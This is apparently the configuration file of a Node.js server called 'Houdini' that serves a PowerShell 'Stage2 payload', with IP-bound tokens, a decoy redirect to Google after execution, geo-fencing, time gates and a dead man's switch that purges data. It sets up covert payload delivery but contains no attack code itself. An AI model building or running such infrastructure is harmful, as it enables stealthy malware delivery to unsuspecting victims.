// Houdini Configuration — Adjust per operation
module.exports = {
    // Server
    PORT: process.env.PORT || 3000,
    SERVER_URL: process.env.SERVER_URL || 'http://localhost:3000',
    
    // Database
    DB_PATH: process.env.DB_PATH || './houdini.db',
    
    // Token Settings
    TOKEN_TTL: 24 * 60 * 60 * 1000,        // 24 hours
    IP_BINDING: true,                       // Token locked to requester IP
    TOKEN_PREFIX: 'houdini_',
    
    // Modes
    DEMO_MODE: false,                       // If true, payloads are harmless echoes
    KILL_SWITCH: false,                     // Global off switch
    
    // Rate Limiting
    RATE_LIMIT_WINDOW: 15 * 60 * 1000,     // 15 minutes
    RATE_LIMIT_MAX: 10,                     // Requests per window
    
    // Dashboard Auth
    ADMIN_KEY: process.env.ADMIN_KEY || 'houdini-admin-change-me-now',
    
    // Operational
    PRESTIGE_URL: 'https://www.google.com', // Redirect after execution
    PRESTIGE_DELAY: 3000,                   // ms before redirect
    ACTIVE_PAYLOAD: 'test.ps1',             // Stage2 payload to serve
    
    // Geo/Time (optional enforcement)
    GEO_FENCE: [],                          // ['US','CA'] — empty = no restriction
    TIME_GATE: { start: 0, end: 24 },      // Hour of day (0-24)
    
    // Dead Man's Switch (auto-purge if no admin heartbeat)
    DEAD_MAN_ENABLED: false,
    DEAD_MAN_TIMEOUT: 2 * 60 * 60 * 1000,  // 2 hours
};
